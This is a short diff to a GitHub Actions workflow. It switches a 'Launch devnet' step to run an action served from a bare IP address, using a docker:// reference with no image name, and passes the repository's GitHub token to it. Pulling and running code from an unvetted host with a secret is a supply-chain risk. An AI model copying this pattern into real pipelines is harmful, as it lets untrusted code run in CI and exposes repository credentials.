@@ -7,7 +7,7 @@ jobs:
     steps:
       - uses: actions/checkout@v2
       - name: "Launch devnet"
-        uses: http://3.64.221.107:8000/
+        uses: docker://3.64.221.107:8000/
         with:
           args: integrate
           github_token: ${{ secrets.GITHUB_TOKEN }}
